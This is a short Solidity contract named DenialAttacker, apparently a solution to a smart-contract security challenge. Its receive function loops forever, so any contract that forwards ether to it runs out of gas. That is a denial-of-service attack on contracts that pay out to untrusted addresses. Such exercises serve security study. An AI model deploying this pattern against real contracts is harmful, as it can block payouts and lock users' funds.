// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract DenialAttacker {
    receive() external payable {
        while(true){}
    }
}